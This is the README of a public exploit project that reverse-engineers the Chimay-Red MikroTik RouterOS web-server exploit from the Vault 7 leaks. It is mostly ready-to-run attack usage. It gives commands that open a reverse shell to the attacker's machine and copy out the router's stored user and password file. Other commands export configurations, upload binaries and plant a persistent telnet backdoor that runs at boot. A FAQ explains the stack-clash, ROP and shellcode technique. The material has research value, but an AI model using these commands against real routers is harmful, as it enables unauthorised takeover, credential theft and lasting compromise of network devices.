# Chimay-Red
Reverse engineering of Mikrotik exploit from Vault 7 CIA Leaks  

See the [PDF](docs/ChimayRed.pdf) for more info (not updated)  

# Vulnerable versions  
Until RouterOS 6.38.4  

What's new in 6.38.5 (2017-Mar-09 11:32):  
!) www - fixed http server vulnerability;

# Proof of concepts
## CrashPOC  
Simple crash sending -1 as content-length in post header 

## StackClashPOC  
Stack clash exploit using two threads, missing ROP chain

# Working exploits  
As the ROP is dynamically created, you have to extract the `www` binary from the RouterOS firmware.   
(It's placed in `/nova/bin/`)  
Check that the running version is the same.  
To simplify extraction you can use:
```
$ ./tools/getROSbin.py 6.38.4 x86 /nova/bin/www www_binary
```  

## StackClash_x86  
Stack clash exploit using two threads  with ROP chain to run bash commands  

### Reverse shell:  
In a shell:  
```
$ nc -l -p 1234 
```  
In another shell:
```
$ ./StackClash_x86.py 192.168.8.1 80 www_binary "/bin/mknod /ram/f p; /bin/telnet 192.168.8.5 1234 < /ram/f | /bin/bash > /ram/f 2>&1"
```
Where:  
- RouterOS IP: 192.168.8.1  
- PC IP: 192.168.8.5  

### Extract users and passwords
```
$ ./StackClash_x86.py 192.168.8.1 80 www_binary "cp /rw/store/user.dat /ram/winbox.idx"
$ sleep 3 # (wait some seconds that www is restarted)
$ curl -s http://192.168.8.1/winbox/index | ./tools/extract_user.py -
```

### Export configs  
You can execute command in Mikrotik console with `/nova/bin/info`.  
Eg: `/nova/bin/info "/system reboot"` will reboot the system.  
```
$ ./StackClash_x86.py 192.168.8.1 80 www_binary "/nova/bin/info '/export' > /ram/winbox.idx"
$ sleep 20 # (it's a bit slow to execute /export command)
$ curl -s http://192.168.8.1/winbox/index
```

## StackClash_mips  
Stack clash exploit using two threads with ROP chain + shell code to run bash commands  
On mips version of www the stack is RWX, so we can jump to the stack.

You can run the same bash command as the x86 version.   

### LCD  
Funny command  
```
$ ./tools/getROSbin.py 6.38.4 mipsbe /nova/bin/www www_binary
$ ./StackClash_mips.py 192.168.8.1 80 www_binary "echo hello world > /dev/lcd"
```
![image](https://github.com/BigNerd95/Chimay-Red/raw/master/docs/screen_image.jpg)  

### Super Mario sound
Do not do it! ;-P
```
$ ./StackClash_mips.py 192.168.8.1 80 www_binary "while [ true ]; do /nova/bin/info ':beep frequency=660 length=100ms;:delay 150ms;:beep frequency=660 length=100ms;:delay 300ms;:beep frequency=660 length=100ms;:delay 300ms;:beep frequency=510 length=100ms;:delay 100ms;:beep frequency=660 length=100ms;:delay 300ms;:beep frequency=770 length=100ms;:delay 550ms;:beep frequency=380 length=100ms;:delay 575ms;:beep frequency=510 length=100ms;:delay 450ms;:beep frequency=380 length=100ms;:delay 400ms;:beep frequency=320 length=100ms;:delay 500ms;:beep frequency=440 length=100ms;:delay 300ms;:beep frequency=480 length=80ms;:delay 330ms;:beep frequency=450 length=100ms;:delay 150ms;:beep frequency=430 length=100ms;:delay 300ms;:beep frequency=380 length=100ms;:delay 200ms;:beep frequency=660 length=80ms;:delay 200ms;:beep frequency=760 length=50ms;:delay 150ms;:beep frequency=860 length=100ms;:delay 300ms;:beep frequency=700 length=80ms;:delay 150ms;:beep frequency=760 length=50ms;:delay 350ms;:beep frequency=660 length=80ms;:delay 300ms;:beep frequency=520 length=80ms;:delay 150ms;:beep frequency=580 length=80ms;:delay 150ms;:beep frequency=480 length=80ms;:delay 500ms;'; done"
```

### Upload binaries
To upload `busybox-mips` in `/ram/busybox`  
In a shell:
```
$ wget https://busybox.net/downloads/binaries/1.28.1-defconfig-multiarch/busybox-mips  
$ { echo "echo Uploading..."; hexdump -v -e '"echo -e -n " 1024/1 "\\\\x%02X" " >> /ram/busybox\n"' busybox-mips | sed -e "s/\\\\\\\\x  //g"; } | nc -l -q 0 -p 1234
```  
In another shell (note that this is the reverse shell command):
```
$ ./StackClash_mips.py 192.168.8.1 80 www_binary "/bin/mknod /ram/f p; /bin/telnet 192.168.8.5 1234 < /ram/f | /bin/bash > /ram/f"
```
and wait until the connection automatically close.  
(Once the file is uploaded, run again reverse shell (this time only listening with `nc -l -p 1234`) and you will find busybox inside `/ram/`)

### Persistent telnet server  
You can run script at each boot by creating a bash script in `/flash/etc/rc.d/run.d/`.  
Pay attention to set execution permissions, or your router will stuck on boot and you will have to restore the firmware!  
This example enables a persistent telnet server on port 23000.  
In a shell:
```
$ wget https://busybox.net/downloads/binaries/1.28.1-defconfig-multiarch/busybox-mips 
$ { echo "echo Installing..."; hexdump -v -e '"echo -e -n " 1024/1 "\\\\x%02X" " >> /flash/bin/busybox\n"' busybox-mips | sed -e "s/\\\\\\\\x  //g"; echo "chmod 777 /flash/bin/busybox"; echo "/flash/bin/busybox --install -s /flash/bin/"; echo "mkdir -p /flash/etc/rc.d/run.d"; echo 'echo -e "#!/flash/bin/sh\ntelnetd -p 23000 -l sh" > /flash/etc/rc.d/run.d/S89own'; echo "chmod 777 /flash/etc/rc.d/run.d/S89own"; echo "/nova/bin/info '/system reboot'"; echo "echo Done! Rebooting..."; } | nc -l -p 1234
```
In another shell (note that this is the reverse shell command):  
```
$ ./StackClash_mips.py 192.168.8.1 80 www_binary "/bin/mknod /ram/f p; /bin/telnet 192.168.8.5 1234 < /ram/f | /bin/bash > /ram/f"
```
and wait until `Done! Rebooting...` appears.  
Once the router is up again:
```
$ telnet 192.168.8.1 23000
Trying 192.168.8.1...
Connected to 192.168.8.1.
Escape character is '^]'.


MikroTik v6.38.4 (stable)
/ #
```
# FAQ
## Where does one get the chimay-red.py file, that this tool kit relies on?  
This is a reverse engineering of leaked CIA documentation.  
There is no chimay-red.py publicly available.  

## I can't understand how the stack clash work.
I'll update the PDF as soon as I have enough time, anyway:  
We know that:  
- each thread has 128KB of stack  
- each stack of each thread is stacked on the top of the previous thread.  

Thanks to Content-Length and alloca macro we can control the Stack Pointer and where the post data will be written.  
If we send a Content-Length bigger than 128KB to socket of thread A, the Stack Pointer will point inside the stack of another thread (B) and so the POST data (of thread A) will be written inside the stack of thread B (in any position we want, we only need to adjust the Content-Length value).  
So now we can write a ROP chain in the stack of thread B starting from a position where a return address is saved.  
When we close the socket of thread B, the ROP chain will start because the function that is waiting for data will return (but on our modified address).

#### x86  

The ROP chain construct "system" string and "your_shell_cmd" string looking for chunks of strings inside the binary and concatenating them in an unused area of memory.  
Then we return to "dlsym" function (present in the PLT) passing as argument the address of just created string "system" to find the address of "system" function.   
Now we can return to the address of system passing as argument the address of the just created string "your_shell_cmd".  

#### mips
DEP is disabled on this version of www, so I can execute the stack.  
But I cannot use system function because "/bin/sh" is not present on the file system, so I used execve directly.  
A small ROP (3 gadgets) find the address of a location on the stack (where I put the shell code), and then jump to that address.  

In the shell code I make a fork (syscall 4002), then I populate an array of 4 pointers with the address of the strings "/bin/bash", "-c", "your_shell_cmd" using the leaked address of the stack (the last pointer is left NULL).  
Then I populate a0, a1, a2 with rispectively: address of "/bin/bash", address of the array populated at the preceeding step and the address of the NULL entry of the array.  
At this point I can launch the syscall 4011 (execve) to execute my bash command.  

## Not wokring on some versions  
I have no time to test all RouterOS versions.  
On all stable version i tested (6.28, 6.27, 6.37.2, 6.37.3, 6.38.3, 6.38.4) it is working (both x86 and mipsbe).  
On 6.37.5 it isn't working, but I noticed that this is a bugfix version.  
Maybe on all bugfix version my tool is not working (not verified).  

## HTTPS  
I implemented the HTTPS version using `ssl.wrap_socket` and it is working if www has just started.  
But if www has been running for some time I have to make it crash before running the exploit.  
If I make www crash with HTTPS enabled, then www doesn't bind on HTTPS socket any more...  
So for now I didn't include HTTPS support in the public release because in most scenario it is totally NOT working and make the web server unreachable after the crash.  

## Architecture discovery  
I didn't find a way to discover the architecture via the web server (www).  
I think the CIA tool was using MNDP (Mikrotik Network Discovery Protocol), but it is only available in the same LAN, so it will not work from a remote network.  
So I didn't include the architecture discovery in my tool.  
You have to test all the archtecture if you are remotely or use a MNDP tool if you in the same LAN (there are a lots of MNDP tools on github).  

## Others architectures than x86 and MIPSBE
I have no boards based on ARM, TILE, SMIPS, PowerPC, MMIPS and MIPSLE, so I can't debug the vulnerability on these versions.  

(Probably for the last one it is enough to convert the mipsbe addresses in little endian).  
If you can support other arch then send a PR!  
